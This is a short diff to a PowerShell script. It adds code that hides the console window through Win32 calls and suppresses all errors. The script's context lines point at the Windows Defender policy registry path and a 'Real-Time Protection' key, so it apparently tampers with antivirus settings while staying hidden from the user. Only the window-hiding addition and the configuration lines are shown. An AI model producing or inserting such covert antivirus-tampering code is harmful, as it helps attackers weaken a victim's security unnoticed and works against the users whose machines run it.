@@ -1,3 +1,9 @@
+# ===== HIDE WINDOW =====
+try {
+    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
+    $w = [C.W]::GetConsoleWindow()
+    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
+} catch {}
 # --- Config ---
 $DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $RealTimeProtectionKey = "Real-Time Protection"
